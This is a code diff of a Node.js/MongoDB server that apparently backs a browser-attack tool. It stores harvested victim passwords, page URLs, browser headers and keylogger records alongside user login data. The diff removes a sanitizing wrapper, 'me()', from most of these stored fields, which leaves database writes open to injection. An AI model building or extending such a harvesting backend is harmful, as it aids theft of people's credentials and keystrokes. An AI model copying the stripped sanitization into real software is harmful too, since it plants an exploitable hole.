@@ -144,7 +144,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								$push: {
 									logins: {
 										timestamp	: new Date(),
-										ip			: me(ipAddress),
+										ip			: ipAddress,
 										token		: token,
 										login_type	: loginMethod
 									}
@@ -155,8 +155,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						} else {
 							// User doesn't exist in database
 							users.insertOne({
-								username	: me(user.login),
-								id			: me(user.id),
+								username	: user.login,
+								id			: user.id,
 								payment		: {
 									account_type	: "free",
 									method			: "none"
@@ -164,7 +164,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								github		: user,
 								logins		: [{
 									timestamp	: new Date(),
-									ip			: me(ipAddress),
+									ip			: ipAddress,
 									token		: token,
 									login_type	: loginMethod
 								}]
@@ -647,16 +647,16 @@ MongoClient.connect(config.mongodb, function(err, db) {
 											$push: {
 												passwords: {
 													timestamp	: new Date(),
-													username	: me(record[username]),
-													password	: me(record[password]),
+													username	: record[username],
+													password	: record[password],
 													url			: {
-														title: me(record[title]),
-														href: me(record[url])
+														title: record[title],
+														href: record[url]
 													},
 													ip			: ip,
 													browser: {
-														width		: me(record[width]),
-														height		: me(record[height]),
+														width		: record[width],
+														height		: record[height],
 														'user-agent': parseAgent(headers["user-agent"]),
 														headers		: me(headers)
 													},
@@ -717,11 +717,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 													{
 														$push: {
 															keylogger: {
-																timestamp	: me(timestamp),
-																ip			: me(ip),
+																timestamp	: timestamp,
+																ip			: ip,
 																url			: {
-																	title: me(record[title]),
-																	href: me(record[url])
+																	title: record[title],
+																	href: record[url]
 																},
 																browser: {
 																	headers		: me(headers),
